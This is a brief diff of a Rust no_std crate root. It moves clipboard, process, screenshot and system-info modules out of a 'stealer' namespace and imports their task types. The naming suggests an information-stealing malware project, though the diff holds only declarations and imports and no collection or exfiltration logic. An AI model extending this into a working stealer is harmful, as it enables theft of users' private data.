@@ -1,12 +1,18 @@
-mod screenshot;
-mod processes;
-mod systeminfo;
-mod clipboard;
+#![no_std]
+#![allow(unsafe_op_in_unsafe_fn)]
 
-use crate::stealer::clipboard::ClipboardTask;
-use crate::stealer::processes::ProcessesTask;
-use crate::stealer::screenshot::ScreenshotTask;
-use crate::stealer::systeminfo::SystemInfoTask;
+
+mod clipboard;
+mod processes;
+mod screenshot;
+mod systeminfo;
+
+extern crate alloc;
+
+use crate::clipboard::ClipboardTask;
+use crate::processes::ProcessesTask;
+use crate::screenshot::ScreenshotTask;
+use crate::systeminfo::SystemInfoTask;
 use alloc::sync::Arc;
 use alloc::vec;
 use tasks::{CompositeTask, Task};
